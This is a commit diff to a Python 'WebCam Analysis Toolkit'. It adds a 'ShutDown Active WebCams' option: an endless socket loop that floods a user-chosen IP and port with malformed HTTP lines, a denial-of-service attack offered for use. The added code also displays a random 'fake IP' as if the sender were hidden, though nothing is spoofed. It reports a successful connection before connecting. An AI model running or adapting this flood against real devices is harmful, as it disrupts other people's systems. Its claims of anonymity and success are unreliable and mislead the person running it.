5861d7295d09d8c52f62386efdf2d510c85107d7
GospelCoding33 <130040013+GospelHack33@users.noreply.github.com>
2023-04-12 21:30:27 +0100

    Add files via upload

--- gospelcoding.py
+++ gospelcoding.py
@@ -3,11 +3,13 @@
 # start
 import time
 import os
+import socket
 import requests
 import cfonts
 from requests.structures import CaseInsensitiveDict
 from colorama import Fore, Back
 import re
+import random
 
 headers = CaseInsensitiveDict()
 headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
@@ -26,16 +28,22 @@ else:
    print(Fore.RED+'[*] Unable To Clear Screen Output...'+Fore.WHITE)
 #
 
+
+#...
+ip = ('.'.join(str(random.randint(0, 255)) for _ in range(4)))
+
 # ...
 app_title = cfonts.render('Gospel Coding', colors=['red', 'blue'], align='center')
 print(app_title)
 print(Fore.YELLOW+'WebCam Analysis Toolkit'.center(66)+Fore.WHITE)
 print(Fore.BLUE+'V4.3.1'.center(66)+Fore.WHITE)
+print(Fore.YELLOW+f'[ This Is Your Fake IP - {ip} ]'.center(66)+Fore.WHITE)
 #
 
 # ...
 print(Fore.GREEN+'[01] Fetch Active WebCams In A Country'+Fore.WHITE, '\n')
 print(Fore.GREEN+'\n[02] Get Latest WebCams Footages In A Country [image video]'+Fore.WHITE, '\n')
+print(Fore.GREEN+'\n[03] ShutDown Active WebCams'+Fore.WHITE, '\n')
 #
 
 # ...
@@ -105,3 +113,29 @@ elif opt == 2:
         for footages in srch:
             print(Fore.RED+'[*] '+footages+Fore.WHITE, '\n')
 
+elif opt == 3:
+     print(Fore.YELLOW+'[*] Enter Your API Key To Continue... If Not Available Then Request For An API Key At https://api.windy.com'+Fore.WHITE, '\n')
+     apikey = input(Fore.BLUE+'Enter API Key To Continue >> '+Fore.WHITE)
+     print('\n')
+     print(Fore.BLUE+'[*] Validating API Key... Please Wait.'+Fore.WHITE)
+     req = requests.get(f'https://api.windy.com/api/webcams/v2/list/country=GB/orderby=popularity/limit=20?key={apikey}')
+     if req.text == 'Forbidden':
+        print(Fore.RED+'\n[*] The API Key You Provided Is Incorrect... Check And Try Again Later\n'+Fore.WHITE)
+        exit(0)
+     else:
+        pass
+
+     webcam_ip = input(Fore.BLUE+'\n[*] Enter WebCam I.P >> '+Fore.WHITE)
+     print('\n')
+     port = int(input(Fore.YELLOW+'[*] Port Address >> '+Fore.WHITE))
+     print('\n')
+     def shutdown_webcam():
+         print(Fore.RED+f'[*] Connected To {webcam_ip}:{port} Successfully'+Fore.WHITE)
+         time.sleep(2)
+         print(Fore.RED+'\n[*] Attack Started Successfully...'+Fore.WHITE, '\n')
+         while True:
+              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              s.connect((webcam_ip, port))
+              s.sendto(('GET /'+ webcam_ip + 'HTTP/1.0\r\n').encode('ascii'), (webcam_ip, port))
+              s.sendto(('Host /'+ ip + 'HTTP/1.0\r\n').encode('ascii'), (webcam_ip, port))
+     shutdown_webcam()
